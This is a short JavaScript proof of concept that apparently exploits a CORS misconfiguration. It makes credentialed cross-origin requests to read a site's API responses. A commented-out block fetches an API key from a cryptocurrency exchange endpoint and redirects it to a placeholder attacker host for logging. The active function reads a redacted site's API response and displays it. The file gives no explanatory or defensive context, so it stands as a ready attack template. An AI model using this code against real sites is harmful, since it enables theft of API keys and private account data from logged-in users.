/*var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://btc-exchange/api/requestApiKey',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText;
};
*/

function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.status == 200) {
      alert(this.responseText);
      document.getElementById("report").innerHTML = this.responseText;
    }
};
xhttp.open("GET", "https://www.redacted.com/api/return", true);
xhttp.withCredentials = true;
xhttp.send();
}
